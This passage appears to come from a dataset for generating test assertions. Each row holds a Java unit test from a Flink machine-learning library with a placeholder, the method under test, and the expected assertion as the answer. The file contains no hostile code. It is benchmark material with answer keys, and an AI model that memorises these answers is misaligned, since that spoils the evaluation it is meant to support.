pushMessage(List<Message> inputMessages) throws IOException, DeserializerException { List<Message> failedMessages = super.pushMessage(inputMessages); if (failedMessages.isEmpty()) { return failedMessages; } Map<Boolean, List<Message>> splitLists = errorHandler.split(failedMessages, ErrorScope.RETRY); List<Message> messagesAfterRetry = doRetry(splitLists.get(Boolean.TRUE)); if (!messagesAfterRetry.isEmpty() && appConfig.getRetryFailAfterMaxAttemptsEnable()) { throw new IOException(""exceeded maximum Sink retry attempts""); } messagesAfterRetry.addAll(splitLists.get(Boolean.FALSE)); return messagesAfterRetry; }"	assertFalse(messageList.isEmpty())
"shouldCloseTheSpan() { SinkTracer sinkTracer = new SinkTracer(new MockTracer(), ""logSink"", true); List<Span> spans = sinkTracer.startTrace(messages); sinkTracer.finishTrace(spans); ""<AssertPlaceHolder>""; }
startTrace(List<Message> messages) { if (enabled) { return messages.stream().map(m -> traceMessage(m)).collect(Collectors.toList()); } else { return new ArrayList<>(); } }"	assertEquals(((MockTracer) sinkTracer.getTracer()).finishedSpans().size(), 2)
"testAllReduceWithMoreThanOneArray() { try { DataStream<double[]> elements = env.fromParallelCollection( new NumberSequenceIterator(1L, parallelism), BasicTypeInfo.LONG_TYPE_INFO) .flatMap( new FlatMapFunction<Long, double[]>() { @Override public void flatMap( Long value, Collector<double[]> out) { out.collect(new double[100]); out.collect(new double[100]); } });  DataStreamUtils.allReduceSum(elements).addSink(new SinkFunction<double[]>() {}); env.execute(); fail(); } catch (Exception e) { ""<AssertPlaceHolder>""; } }
allReduceSum(DataStream<double[]> input) { // chunkId, originalArrayLength, arrayChunk DataStream<Tuple3<Integer, Integer, double[]>> allReduceSend = input.flatMap(new AllReduceSend()) .setParallelism(input.getParallelism()) .name(""all-reduce-send"");  // taskId, chunkId, originalArrayLength, arrayChunk DataStream<Tuple4<Integer, Integer, Integer, double[]>> allReduceSum = allReduceSend .partitionCustom( (chunkId, numPartitions) -> chunkId % numPartitions, x -> x.f0) .transform( ""all-reduce-sum"", new TupleTypeInfo<>( BasicTypeInfo.INT_TYPE_INFO, BasicTypeInfo.INT_TYPE_INFO, BasicTypeInfo.INT_TYPE_INFO, PrimitiveArrayTypeInfo.DOUBLE_PRIMITIVE_ARRAY_TYPE_INFO), new AllReduceSum()) .setParallelism(input.getParallelism()) .name(""all-reduce-sum"");  return allReduceSum .partitionCustom((taskIdx, numPartitions) -> taskIdx % numPartitions, x -> x.f0) .transform( ""all-reduce-recv"", PrimitiveArrayTypeInfo.DOUBLE_PRIMITIVE_ARRAY_TYPE_INFO, new AllReduceRecv()) .setParallelism(input.getParallelism()) .name(""all-reduce-recv""); }"	"assertEquals( ""The input cannot contain more than one double array."", e.getCause().getCause().getMessage())"
"testAllReduceWithDifferentLength() { try { DataStream<double[]> elements = env.fromParallelCollection( new NumberSequenceIterator(1L, parallelism), BasicTypeInfo.LONG_TYPE_INFO) .map(x -> new double[x.intValue()]);  DataStreamUtils.allReduceSum(elements).addSink(new SinkFunction<double[]>() {}); env.execute(); fail(); } catch (Exception e) { ""<AssertPlaceHolder>""; } }
allReduceSum(DataStream<double[]> input) { // chunkId, originalArrayLength, arrayChunk DataStream<Tuple3<Integer, Integer, double[]>> allReduceSend = input.flatMap(new AllReduceSend()) .setParallelism(input.getParallelism()) .name(""all-reduce-send"");  // taskId, chunkId, originalArrayLength, arrayChunk DataStream<Tuple4<Integer, Integer, Integer, double[]>> allReduceSum = allReduceSend .partitionCustom( (chunkId, numPartitions) -> chunkId % numPartitions, x -> x.f0) .transform( ""all-reduce-sum"", new TupleTypeInfo<>( BasicTypeInfo.INT_TYPE_INFO, BasicTypeInfo.INT_TYPE_INFO, BasicTypeInfo.INT_TYPE_INFO, PrimitiveArrayTypeInfo.DOUBLE_PRIMITIVE_ARRAY_TYPE_INFO), new AllReduceSum()) .setParallelism(input.getParallelism()) .name(""all-reduce-sum"");  return allReduceSum .partitionCustom((taskIdx, numPartitions) -> taskIdx % numPartitions, x -> x.f0) .transform( ""all-reduce-recv"", PrimitiveArrayTypeInfo.DOUBLE_PRIMITIVE_ARRAY_TYPE_INFO, new AllReduceRecv()) .setParallelism(input.getParallelism()) .name(""all-reduce-recv""); }"	"assertEquals( ""The input double array must have same length."", e.getCause().getCause().getMessage())"
"Exception { DataStream<double[]> elements = env.fromParallelCollection( new NumberSequenceIterator(1L, parallelism), BasicTypeInfo.LONG_TYPE_INFO) .flatMap((FlatMapFunction<Long, double[]>) (value, out) -> {}) .returns(PrimitiveArrayTypeInfo.DOUBLE_PRIMITIVE_ARRAY_TYPE_INFO); Iterator<double[]> result = DataStreamUtils.allReduceSum(elements).executeAndCollect(); ""<AssertPlaceHolder>""; }
allReduceSum(DataStream<double[]> input) { // chunkId, originalArrayLength, arrayChunk DataStream<Tuple3<Integer, Integer, double[]>> allReduceSend = input.flatMap(new AllReduceSend()) .setParallelism(input.getParallelism()) .name(""all-reduce-send"");  // taskId, chunkId, originalArrayLength, arrayChunk DataStream<Tuple4<Integer, Integer, Integer, double[]>> allReduceSum = allReduceSend .partitionCustom( (chunkId, numPartitions) -> chunkId % numPartitions, x -> x.f0) .transform( ""all-reduce-sum"", new TupleTypeInfo<>( BasicTypeInfo.INT_TYPE_INFO, BasicTypeInfo.INT_TYPE_INFO, BasicTypeInfo.INT_TYPE_INFO, PrimitiveArrayTypeInfo.DOUBLE_PRIMITIVE_ARRAY_TYPE_INFO), new AllReduceSum()) .setParallelism(input.getParallelism()) .name(""all-reduce-sum"");  return allReduceSum .partitionCustom((taskIdx, numPartitions) -> taskIdx % numPartitions, x -> x.f0) .transform( ""all-reduce-recv"", PrimitiveArrayTypeInfo.DOUBLE_PRIMITIVE_ARRAY_TYPE_INFO, new AllReduceRecv()) .setParallelism(input.getParallelism()) .name(""all-reduce-recv""); }"	assertFalse(result.hasNext())
"Exception { DataStream<Long> dataStream = env.fromParallelCollection(new NumberSequenceIterator(0L, 19L), Types.LONG); DataStream<Integer> countsPerPartition = DataStreamUtils.mapPartition(dataStream, new TestMapPartitionFunc()); List<Integer> counts = IteratorUtils.toList(countsPerPartition.executeAndCollect()); ""<AssertPlaceHolder>""; }
mapPartition( DataStream<IN> input, MapPartitionFunction<IN, OUT> func) { TypeInformation<OUT> outType = TypeExtractor.getMapPartitionReturnTypes(func, input.getType(), null, true); return mapPartition(input, func, outType); }"	assertArrayEquals( new int[] {5, 5, 5, 5}, counts.stream().mapToInt(Integer::intValue).toArray())
"Exception { int numSamples = 10; int[] totalMinusOneChoices = new int[] {0, 5, 9, 10, 11, 20, 30, 40, 200}; for (int totalMinusOne : totalMinusOneChoices) { DataStream<Long> dataStream = env.fromParallelCollection( new NumberSequenceIterator(0L, totalMinusOne), Types.LONG); DataStream<Long> result = DataStreamUtils.sample(dataStream, numSamples, 0); //noinspection unchecked List<String> sampled = IteratorUtils.toList(result.executeAndCollect()); ""<AssertPlaceHolder>""; } }
sample(DataStream<T> input, int numSamples, long randomSeed) { int inputParallelism = input.getParallelism();  // The maximum difference of number of data points in each partition after calling // `rebalance` is `inputParallelism`. As a result, extra `inputParallelism` data points are // sampled for each partition in the first round. int firstRoundNumSamples = Math.min((numSamples / inputParallelism) + inputParallelism, numSamples); return input.rebalance() .transform( ""firstRoundSampling"", input.getType(), new SamplingOperator<>(firstRoundNumSamples, randomSeed)) .setParallelism(inputParallelism) .transform( ""secondRoundSampling"", input.getType(), new SamplingOperator<>(numSamples, randomSeed)) .setParallelism(1) .map(x -> x, input.getType()) .setParallelism(inputParallelism); }"	assertEquals(Math.min(numSamples, totalMinusOne + 1), sampled.size())
"Exception { IterationID iterationId = new IterationID(); OperatorID operatorId = new OperatorID();  createHarnessAndRun( iterationId, operatorId, null, harness -> { CompletableFuture<Void> coordinatorResult = CompletableFuture.supplyAsync( () -> { try { // Slight postpone the notification Thread.sleep(2000);  harness.getStreamTask() .dispatchOperatorEvent( operatorId, new SerializedValue<>( new GloballyAlignedEvent( 5, false))); harness.getStreamTask() .dispatchOperatorEvent( operatorId, new SerializedValue<>( new CoordinatorCheckpointEvent( 5))); return null; } catch (Throwable e) { RecordingHeadOperatorFactory.latestHeadOperator .getMailboxExecutor() .execute( () -> { throw e; }, ""poison mail""); throw new CompletionException(e); } });  CheckpointBarrier barrier = new CheckpointBarrier( 5, 5000, CheckpointOptions.alignedNoTimeout( CheckpointType.CHECKPOINT, CheckpointStorageLocationReference.getDefault())); harness.processEvent(barrier);  // There should be no exception coordinatorResult.get();  // If the task do not hold, it would be likely snapshot state before received // the globally aligned event. ""<AssertPlaceHolder>""; return null; }); }
getMailboxExecutor() { return mailboxExecutor; }"	assertEquals( Arrays.asList( new StreamRecord<>( IterationRecord.newEpochWatermark( 5, OperatorUtils.getUniqueSenderId(operatorId, 0)), 0), barrier), new ArrayList<>(harness.getOutput()))
"Exception { IterationID iterationId = new IterationID();  IterationRecordTypeInfo typeInfo = new IterationRecordTypeInfo<>(BasicTypeInfo.INT_TYPE_INFO); TypeSerializer serializer = typeInfo.createSerializer(new ExecutionConfig()); OneInputStreamOperatorTestHarness<IterationRecord<?>, Void> testHarness = new OneInputStreamOperatorTestHarness<>( new TailOperator(iterationId, 0), serializer); testHarness.open(); SpillableFeedbackChannel channel = initializeFeedbackChannel(testHarness.getOperator(), iterationId, 0, 0, 0);  testHarness.processElement(IterationRecord.newRecord(1, 1), 2); testHarness.processElement(IterationRecord.newRecord(2, 1), 3); testHarness.processElement(IterationRecord.newEpochWatermark(2, ""sender1""), 4);  List<StreamRecord<IterationRecord<?>>> iterationRecords = getFeedbackRecords(channel); ""<AssertPlaceHolder>""; }
open() throws Exception { super.open();  int indexOfThisSubtask = getRuntimeContext().getIndexOfThisSubtask(); int attemptNum = getRuntimeContext().getAttemptNumber();  FeedbackKey<StreamRecord<IterationRecord<?>>> feedbackKey = OperatorUtils.createFeedbackKey(iterationId, feedbackIndex); SubtaskFeedbackKey<StreamRecord<IterationRecord<?>>> key = feedbackKey.withSubTaskIndex(indexOfThisSubtask, attemptNum);  SpillableFeedbackChannelBroker broker = SpillableFeedbackChannelBroker.get(); this.channel = broker.getChannel(key, null);  this.recordConsumer = getExecutionConfig().isObjectReuseEnabled() ? this::processIfObjectReuseEnabled : this::processIfObjectReuseNotEnabled; }"	"assertEquals( Arrays.asList( new StreamRecord<>(IterationRecord.newRecord(1, 2), 2), new StreamRecord<>(IterationRecord.newRecord(2, 2), 3), new StreamRecord<>(IterationRecord.newEpochWatermark(3, ""sender1""), 4)), iterationRecords)"
"Exception { IterationID iterationId = new IterationID();  IterationRecordTypeInfo typeInfo = new IterationRecordTypeInfo<>(BasicTypeInfo.INT_TYPE_INFO); TypeSerializer serializer = typeInfo.createSerializer(new ExecutionConfig());  OneInputStreamOperatorTestHarness<IterationRecord<?>, Void> testHarness = new OneInputStreamOperatorTestHarness<>( new TailOperator(iterationId, 0), serializer); testHarness.getExecutionConfig().enableObjectReuse(); testHarness.open(); SpillableFeedbackChannel channel = initializeFeedbackChannel(testHarness.getOperator(), iterationId, 0, 0, 0);  IterationRecord<Integer> reuse = IterationRecord.newRecord(1, 1); testHarness.processElement(reuse, 2);  reuse.setValue(2); testHarness.processElement(reuse, 3);  reuse.setType(IterationRecord.Type.EPOCH_WATERMARK); reuse.setEpoch(2); reuse.setSender(""sender1""); testHarness.processElement(reuse, 4);  List<StreamRecord<IterationRecord<?>>> iterationRecords = getFeedbackRecords(channel); ""<AssertPlaceHolder>""; }
open() throws Exception { super.open();  int indexOfThisSubtask = getRuntimeContext().getIndexOfThisSubtask(); int attemptNum = getRuntimeContext().getAttemptNumber();  FeedbackKey<StreamRecord<IterationRecord<?>>> feedbackKey = OperatorUtils.createFeedbackKey(iterationId, feedbackIndex); SubtaskFeedbackKey<StreamRecord<IterationRecord<?>>> key = feedbackKey.withSubTaskIndex(indexOfThisSubtask, attemptNum);  SpillableFeedbackChannelBroker broker = SpillableFeedbackChannelBroker.get(); this.channel = broker.getChannel(key, null);  this.recordConsumer = getExecutionConfig().isObjectReuseEnabled() ? this::processIfObjectReuseEnabled : this::processIfObjectReuseNotEnabled; }"	"assertEquals( Arrays.asList( new StreamRecord<>(IterationRecord.newRecord(1, 2), 2), new StreamRecord<>(IterationRecord.newRecord(2, 2), 3), new StreamRecord<>(IterationRecord.newEpochWatermark(3, ""sender1""), 4)), iterationRecords)"
"testNotSendCheckpointEventIfTerminating() { IterationID iterationId = new IterationID(); List<OperatorID> operatorIds = Arrays.asList(new OperatorID(), new OperatorID()); List<Integer> parallelisms = Arrays.asList(2, 3); List<RecordingListener> listeners = Arrays.asList(new RecordingListener(), new RecordingListener()); SharedProgressAligner aligner = initializeAligner(iterationId, operatorIds, parallelisms, listeners);  for (int i = 0; i < operatorIds.size(); ++i) { for (int j = 0; j < parallelisms.get(i); ++j) { aligner.reportSubtaskProgress( operatorIds.get(i), j, new SubtaskAlignedEvent(1, 0, false)); } }  List<CompletableFuture<byte[]>> secondCheckpointStateFutures = Arrays.asList(new CompletableFuture<>(), new CompletableFuture<>()); for (int i = 0; i < operatorIds.size(); ++i) { // Operator 0 is the criteria stream aligner.requestCheckpoint(2, parallelisms.get(i), secondCheckpointStateFutures.get(i)); }  secondCheckpointStateFutures.forEach(future -> ""<AssertPlaceHolder>""; checkEvents(Collections.singletonList(new GloballyAlignedEvent(1, true)), listeners); }
requestCheckpoint( long checkpointId, int operatorParallelism, CompletableFuture<byte[]> snapshotStateFuture) { runInEventLoop( () -> { CheckpointStatus checkpointStatus = checkpointStatuses.computeIfAbsent( checkpointId, ignored -> new CheckpointStatus(totalHeadParallelism)); boolean aligned = checkpointStatus.notify(operatorParallelism, snapshotStateFuture); if (aligned) { if (!globallyTerminating) { CoordinatorCheckpointEvent checkpointEvent = new CoordinatorCheckpointEvent(checkpointId); for (SharedProgressAlignerListener listener : listeners.values()) { listener.onCheckpointAligned(checkpointEvent); } }  for (CompletableFuture<byte[]> stateFuture : checkpointStatus.getStateFutures()) { stateFuture.complete(new byte[0]); }  checkpointStatuses.remove(checkpointId); } }, ""Coordinator report checkpoint %d"", checkpointId); }"	assertTrue(future.isDone()))
"Exception { Knn knn = new Knn(); Knn loadedKnn = TestUtils.saveAndReload( tEnv, knn, tempFolder.newFolder().getAbsolutePath(), Knn::load); KnnModel knnModel = loadedKnn.fit(trainData); knnModel = TestUtils.saveAndReload( tEnv, knnModel, tempFolder.newFolder().getAbsolutePath(), KnnModel::load); ""<AssertPlaceHolder>""; Table output = knnModel.transform(predictData)[0]; verifyPredictionResult(output, knn.getLabelCol(), knn.getPredictionCol()); }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); /* Tuple3 : <feature, label, norm square> */ DataStream<Tuple3<DenseVector, Double, Double>> inputDataWithNorm = computeNormSquare(tEnv.toDataStream(inputs[0])); DataStream<KnnModelData> modelData = genModelData(inputDataWithNorm); KnnModel model = new KnnModel().setModelData(tEnv.fromDataStream(modelData)); ParamUtils.updateExistingParams(model, getParamMap()); return model; }"	"assertEquals( Arrays.asList(""packedFeatures"", ""featureNormSquares"", ""labels""), knnModel.getModelData()[0].getResolvedSchema().getColumnNames())"
"testOutputSchema() { Table tempTable = trainDataTable.as(""test_features"", ""test_label"", ""test_weight""); LinearSVC linearSVC = new LinearSVC() .setFeaturesCol(""test_features"") .setLabelCol(""test_label"") .setWeightCol(""test_weight"") .setPredictionCol(""test_predictionCol"") .setRawPredictionCol(""test_rawPredictionCol""); Table output = linearSVC.fit(trainDataTable).transform(tempTable)[0]; ""<AssertPlaceHolder>""; }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment();  DataStream<LabeledPointWithWeight> trainData = tEnv.toDataStream(inputs[0]) .map( dataPoint -> { double weight = getWeightCol() == null ? 1.0 : ((Number) dataPoint.getField(getWeightCol())) .doubleValue(); double label = ((Number) dataPoint.getField(getLabelCol())) .doubleValue(); Preconditions.checkState( Double.compare(0.0, label) == 0 || Double.compare(1.0, label) == 0, ""LinearSVC only supports binary classification. But detected label: %s."", label); DenseVector features = ((Vector) dataPoint.getField(getFeaturesCol())) .toDense(); return new LabeledPointWithWeight(features, label, weight); });  DataStream<DenseVector> initModelData = DataStreamUtils.reduce( trainData.map(x -> x.getFeatures().size()), (ReduceFunction<Integer>) (t0, t1) -> { Preconditions.checkState( t0.equals(t1), ""The training data should all have same dimensions.""); return t0; }) .map(DenseVector::new);  Optimizer optimizer = new SGD( getMaxIter(), getLearningRate(), getGlobalBatchSize(), getTol(), getReg(), getElasticNet()); DataStream<DenseVector> rawModelData = optimizer.optimize(initModelData, trainData, HingeLoss.INSTANCE);  DataStream<LinearSVCModelData> modelData = rawModelData.map(LinearSVCModelData::new); LinearSVCModel model = new LinearSVCModel().setModelData(tEnv.fromDataStream(modelData)); ParamUtils.updateExistingParams(model, paramMap); return model; }"	"assertEquals( Arrays.asList( ""test_features"", ""test_label"", ""test_weight"", ""test_predictionCol"", ""test_rawPredictionCol""), output.getResolvedSchema().getColumnNames())"
"Exception { LinearSVC linearSVC = new LinearSVC().setWeightCol(""weight""); linearSVC = TestUtils.saveAndReload( tEnv, linearSVC, tempFolder.newFolder().getAbsolutePath(), LinearSVC::load); LinearSVCModel model = linearSVC.fit(trainDataTable); model = TestUtils.saveAndReload( tEnv, model, tempFolder.newFolder().getAbsolutePath(), LinearSVCModel::load); ""<AssertPlaceHolder>""; Table output = model.transform(trainDataTable)[0]; verifyPredictionResult( output, linearSVC.getFeaturesCol(), linearSVC.getPredictionCol(), linearSVC.getRawPredictionCol()); }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment();  DataStream<LabeledPointWithWeight> trainData = tEnv.toDataStream(inputs[0]) .map( dataPoint -> { double weight = getWeightCol() == null ? 1.0 : ((Number) dataPoint.getField(getWeightCol())) .doubleValue(); double label = ((Number) dataPoint.getField(getLabelCol())) .doubleValue(); Preconditions.checkState( Double.compare(0.0, label) == 0 || Double.compare(1.0, label) == 0, ""LinearSVC only supports binary classification. But detected label: %s."", label); DenseVector features = ((Vector) dataPoint.getField(getFeaturesCol())) .toDense(); return new LabeledPointWithWeight(features, label, weight); });  DataStream<DenseVector> initModelData = DataStreamUtils.reduce( trainData.map(x -> x.getFeatures().size()), (ReduceFunction<Integer>) (t0, t1) -> { Preconditions.checkState( t0.equals(t1), ""The training data should all have same dimensions.""); return t0; }) .map(DenseVector::new);  Optimizer optimizer = new SGD( getMaxIter(), getLearningRate(), getGlobalBatchSize(), getTol(), getReg(), getElasticNet()); DataStream<DenseVector> rawModelData = optimizer.optimize(initModelData, trainData, HingeLoss.INSTANCE);  DataStream<LinearSVCModelData> modelData = rawModelData.map(LinearSVCModelData::new); LinearSVCModel model = new LinearSVCModel().setModelData(tEnv.fromDataStream(modelData)); ParamUtils.updateExistingParams(model, paramMap); return model; }"	"assertEquals( Collections.singletonList(""coefficient""), model.getModelData()[0].getResolvedSchema().getColumnNames())"
"testOutputSchema() { Table tempTable = binomialDataTable.as(""test_features"", ""test_label"", ""test_weight""); LogisticRegression logisticRegression = new LogisticRegression() .setFeaturesCol(""test_features"") .setLabelCol(""test_label"") .setWeightCol(""test_weight"") .setPredictionCol(""test_predictionCol"") .setRawPredictionCol(""test_rawPredictionCol""); Table output = logisticRegression.fit(binomialDataTable).transform(tempTable)[0]; ""<AssertPlaceHolder>""; }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); String classificationType = getMultiClass(); Preconditions.checkArgument( ""auto"".equals(classificationType) || ""binomial"".equals(classificationType), ""Multinomial classification is not supported yet. Supported options: [auto, binomial].""); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment();  DataStream<LabeledPointWithWeight> trainData = tEnv.toDataStream(inputs[0]) .map( dataPoint -> { double weight = getWeightCol() == null ? 1.0 : ((Number) dataPoint.getField(getWeightCol())) .doubleValue(); double label = ((Number) dataPoint.getField(getLabelCol())) .doubleValue(); boolean isBinomial = Double.compare(0., label) == 0 || Double.compare(1., label) == 0; if (!isBinomial) { throw new RuntimeException( ""Multinomial classification is not supported yet. Supported options: [auto, binomial].""); } DenseVector features = ((Vector) dataPoint.getField(getFeaturesCol())) .toDense(); return new LabeledPointWithWeight(features, label, weight); });  DataStream<DenseVector> initModelData = DataStreamUtils.reduce( trainData.map(x -> x.getFeatures().size()), (ReduceFunction<Integer>) (t0, t1) -> { Preconditions.checkState( t0.equals(t1), ""The training data should all have same dimensions.""); return t0; }) .map(DenseVector::new);  Optimizer optimizer = new SGD( getMaxIter(), getLearningRate(), getGlobalBatchSize(), getTol(), getReg(), getElasticNet()); DataStream<DenseVector> rawModelData = optimizer.optimize(initModelData, trainData, BinaryLogisticLoss.INSTANCE);  DataStream<LogisticRegressionModelData> modelData = rawModelData.map(vector -> new LogisticRegressionModelData(vector, 0L)); LogisticRegressionModel model = new LogisticRegressionModel().setModelData(tEnv.fromDataStream(modelData)); ParamUtils.updateExistingParams(model, paramMap); return model; }"	"assertEquals( Arrays.asList( ""test_features"", ""test_label"", ""test_weight"", ""test_predictionCol"", ""test_rawPredictionCol""), output.getResolvedSchema().getColumnNames())"
"Exception { LogisticRegression logisticRegression = new LogisticRegression().setWeightCol(""weight""); logisticRegression = TestUtils.saveAndReload( tEnv, logisticRegression, tempFolder.newFolder().getAbsolutePath(), LogisticRegression::load); LogisticRegressionModel model = logisticRegression.fit(binomialDataTable); model = TestUtils.saveAndReload( tEnv, model, tempFolder.newFolder().getAbsolutePath(), LogisticRegressionModel::load); ""<AssertPlaceHolder>""; Table output = model.transform(binomialDataTable)[0]; verifyPredictionResult( output, logisticRegression.getFeaturesCol(), logisticRegression.getPredictionCol(), logisticRegression.getRawPredictionCol()); }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); String classificationType = getMultiClass(); Preconditions.checkArgument( ""auto"".equals(classificationType) || ""binomial"".equals(classificationType), ""Multinomial classification is not supported yet. Supported options: [auto, binomial].""); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment();  DataStream<LabeledPointWithWeight> trainData = tEnv.toDataStream(inputs[0]) .map( dataPoint -> { double weight = getWeightCol() == null ? 1.0 : ((Number) dataPoint.getField(getWeightCol())) .doubleValue(); double label = ((Number) dataPoint.getField(getLabelCol())) .doubleValue(); boolean isBinomial = Double.compare(0., label) == 0 || Double.compare(1., label) == 0; if (!isBinomial) { throw new RuntimeException( ""Multinomial classification is not supported yet. Supported options: [auto, binomial].""); } DenseVector features = ((Vector) dataPoint.getField(getFeaturesCol())) .toDense(); return new LabeledPointWithWeight(features, label, weight); });  DataStream<DenseVector> initModelData = DataStreamUtils.reduce( trainData.map(x -> x.getFeatures().size()), (ReduceFunction<Integer>) (t0, t1) -> { Preconditions.checkState( t0.equals(t1), ""The training data should all have same dimensions.""); return t0; }) .map(DenseVector::new);  Optimizer optimizer = new SGD( getMaxIter(), getLearningRate(), getGlobalBatchSize(), getTol(), getReg(), getElasticNet()); DataStream<DenseVector> rawModelData = optimizer.optimize(initModelData, trainData, BinaryLogisticLoss.INSTANCE);  DataStream<LogisticRegressionModelData> modelData = rawModelData.map(vector -> new LogisticRegressionModelData(vector, 0L)); LogisticRegressionModel model = new LogisticRegressionModel().setModelData(tEnv.fromDataStream(modelData)); ParamUtils.updateExistingParams(model, paramMap); return model; }"	"assertEquals( Arrays.asList(""coefficient"", ""modelVersion""), model.getModelData()[0].getResolvedSchema().getColumnNames())"
"testMultinomialFit() { try { new LogisticRegression().fit(multinomialDataTable); env.execute(); fail(); } catch (Throwable e) { ""<AssertPlaceHolder>""; } }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); String classificationType = getMultiClass(); Preconditions.checkArgument( ""auto"".equals(classificationType) || ""binomial"".equals(classificationType), ""Multinomial classification is not supported yet. Supported options: [auto, binomial].""); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment();  DataStream<LabeledPointWithWeight> trainData = tEnv.toDataStream(inputs[0]) .map( dataPoint -> { double weight = getWeightCol() == null ? 1.0 : ((Number) dataPoint.getField(getWeightCol())) .doubleValue(); double label = ((Number) dataPoint.getField(getLabelCol())) .doubleValue(); boolean isBinomial = Double.compare(0., label) == 0 || Double.compare(1., label) == 0; if (!isBinomial) { throw new RuntimeException( ""Multinomial classification is not supported yet. Supported options: [auto, binomial].""); } DenseVector features = ((Vector) dataPoint.getField(getFeaturesCol())) .toDense(); return new LabeledPointWithWeight(features, label, weight); });  DataStream<DenseVector> initModelData = DataStreamUtils.reduce( trainData.map(x -> x.getFeatures().size()), (ReduceFunction<Integer>) (t0, t1) -> { Preconditions.checkState( t0.equals(t1), ""The training data should all have same dimensions.""); return t0; }) .map(DenseVector::new);  Optimizer optimizer = new SGD( getMaxIter(), getLearningRate(), getGlobalBatchSize(), getTol(), getReg(), getElasticNet()); DataStream<DenseVector> rawModelData = optimizer.optimize(initModelData, trainData, BinaryLogisticLoss.INSTANCE);  DataStream<LogisticRegressionModelData> modelData = rawModelData.map(vector -> new LogisticRegressionModelData(vector, 0L)); LogisticRegressionModel model = new LogisticRegressionModel().setModelData(tEnv.fromDataStream(modelData)); ParamUtils.updateExistingParams(model, paramMap); return model; }"	"assertEquals( ""Multinomial classification is not supported yet. Supported options: [auto, binomial]."", ExceptionUtils.getRootCause(e).getMessage())"
"testFitAndPredict() { NaiveBayesModel model = estimator.fit(trainTable); Table outputTable = model.transform(predictTable)[0]; Map<Vector, Double> actualOutput = executeAndCollect(outputTable, model.getFeaturesCol(), model.getPredictionCol()); ""<AssertPlaceHolder>""; }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1);  final String featuresCol = getFeaturesCol(); final String labelCol = getLabelCol(); final double smoothing = getSmoothing();  StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); DataStream<Tuple2<Vector, Double>> input = tEnv.toDataStream(inputs[0]) .map( (MapFunction<Row, Tuple2<Vector, Double>>) row -> { Number number = (Number) row.getField(labelCol); Preconditions.checkNotNull( number, ""Input data should contain label value.""); Preconditions.checkArgument( number.intValue() == number.doubleValue(), ""Label value should be indexed number.""); return new Tuple2<>( (Vector) row.getField(featuresCol), number.doubleValue()); }, Types.TUPLE(VectorTypeInfo.INSTANCE, Types.DOUBLE));  DataStream<Tuple3<Double, Integer, Double>> feature = input.flatMap(new ExtractFeatureFunction());  DataStream<Tuple4<Double, Integer, Map<Double, Double>, Integer>> featureWeight = DataStreamUtils.mapPartition( feature.keyBy(value -> new Tuple2<>(value.f0, value.f1).hashCode()), new GenerateFeatureWeightMapFunction(), Types.TUPLE( Types.DOUBLE, Types.INT, Types.MAP(Types.DOUBLE, Types.DOUBLE), Types.INT));  DataStream<Tuple3<Double, Integer, Map<Double, Double>[]>> aggregatedArrays = DataStreamUtils.mapPartition( featureWeight.keyBy(value -> value.f0), new AggregateIntoArrayFunction(), Types.TUPLE( Types.DOUBLE, Types.INT, Types.OBJECT_ARRAY(Types.MAP(Types.DOUBLE, Types.DOUBLE))));  DataStream<NaiveBayesModelData> modelData = DataStreamUtils.mapPartition( aggregatedArrays, new GenerateModelFunction(smoothing), NaiveBayesModelData.TYPE_INFO); modelData.getTransformation().setParallelism(1);  Schema schema = Schema.newBuilder() .column( ""theta"", DataTypes.ARRAY( DataTypes.ARRAY( DataTypes.MAP( DataTypes.DOUBLE(), DataTypes.DOUBLE())))) .column(""piArray"", DataTypes.of(DenseVectorTypeInfo.INSTANCE)) .column(""labels"", DataTypes.of(DenseVectorTypeInfo.INSTANCE)) .build();  NaiveBayesModel model = new NaiveBayesModel().setModelData(tEnv.fromDataStream(modelData, schema)); ParamUtils.updateExistingParams(model, paramMap); return model; }"	assertEquals(expectedOutput, actualOutput)
"testOutputSchema() { trainTable = trainTable.as(""test_features"", ""test_label""); predictTable = predictTable.as(""test_features"");  estimator .setFeaturesCol(""test_features"") .setLabelCol(""test_label"") .setPredictionCol(""test_prediction"");  NaiveBayesModel model = estimator.fit(trainTable); Table outputTable = model.transform(predictTable)[0]; Map<Vector, Double> actualOutput = executeAndCollect(outputTable, model.getFeaturesCol(), model.getPredictionCol()); ""<AssertPlaceHolder>""; }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1);  final String featuresCol = getFeaturesCol(); final String labelCol = getLabelCol(); final double smoothing = getSmoothing();  StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); DataStream<Tuple2<Vector, Double>> input = tEnv.toDataStream(inputs[0]) .map( (MapFunction<Row, Tuple2<Vector, Double>>) row -> { Number number = (Number) row.getField(labelCol); Preconditions.checkNotNull( number, ""Input data should contain label value.""); Preconditions.checkArgument( number.intValue() == number.doubleValue(), ""Label value should be indexed number.""); return new Tuple2<>( (Vector) row.getField(featuresCol), number.doubleValue()); }, Types.TUPLE(VectorTypeInfo.INSTANCE, Types.DOUBLE));  DataStream<Tuple3<Double, Integer, Double>> feature = input.flatMap(new ExtractFeatureFunction());  DataStream<Tuple4<Double, Integer, Map<Double, Double>, Integer>> featureWeight = DataStreamUtils.mapPartition( feature.keyBy(value -> new Tuple2<>(value.f0, value.f1).hashCode()), new GenerateFeatureWeightMapFunction(), Types.TUPLE( Types.DOUBLE, Types.INT, Types.MAP(Types.DOUBLE, Types.DOUBLE), Types.INT));  DataStream<Tuple3<Double, Integer, Map<Double, Double>[]>> aggregatedArrays = 